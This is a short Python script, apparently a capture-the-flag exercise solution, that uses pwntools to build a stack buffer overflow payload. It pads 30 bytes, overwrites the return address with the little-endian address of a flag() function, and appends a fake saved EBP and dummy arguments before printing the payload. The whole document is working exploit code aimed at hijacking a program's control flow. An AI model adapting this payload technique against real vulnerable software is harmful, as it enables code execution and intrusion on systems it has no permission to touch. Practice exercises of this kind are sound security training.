from pwn import *

# Address of flag() function
flag_addr = p32(0x80491b6)  # Convert address to little-endian format
junk = b"JUNK"  # Placeholder for saved EBP
fake_param_1 = b"AAAA"  # Dummy value for first argument
fake_param_2 = b"BBBB"  # Dummy value for second argument

# Construct the payload
payload = b"A" * 30  # Buffer overflow until return address
payload += flag_addr  # Overwrite return address with flag() address
payload += junk       # Fake saved EBP (can be anything)
payload += fake_param_1  # First argument (not important yet)
payload += fake_param_2  # Second argument (not important yet)

# Send the payload
print(payload.decode(errors="ignore"))